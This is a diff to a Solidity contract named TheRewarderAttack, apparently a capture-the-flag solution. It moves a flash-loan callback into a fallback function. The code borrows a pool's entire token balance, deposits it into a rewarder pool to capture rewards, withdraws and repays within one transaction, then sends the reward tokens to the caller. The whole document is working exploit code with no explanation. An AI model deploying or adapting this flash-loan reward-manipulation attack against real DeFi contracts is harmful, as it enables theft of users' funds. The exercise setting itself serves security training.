@@ -36,17 +36,18 @@ contract TheRewarderAttack {
         rewardToken = IERC20(rewarderPool.rewardToken());
     }
 
+    fallback() external {
+        uint256 amount = liquidityToken.balanceOf(address(this));
+        liquidityToken.approve(address(rewarderPool), amount);
+        rewarderPool.deposit(amount);
+        rewarderPool.withdraw(amount);
+        liquidityToken.transfer(msg.sender, amount);
+    }
+
     function exploit() external {
         flashLoanPool.flashLoan(
             liquidityToken.balanceOf(address(flashLoanPool))
         );
         rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
-    }
-
-    function receiveFlashLoan(uint256 amount) external {
-        liquidityToken.approve(address(rewarderPool), amount);
-        rewarderPool.deposit(amount);
-        rewarderPool.withdraw(amount);
-        liquidityToken.transfer(msg.sender, amount);
     }
 }
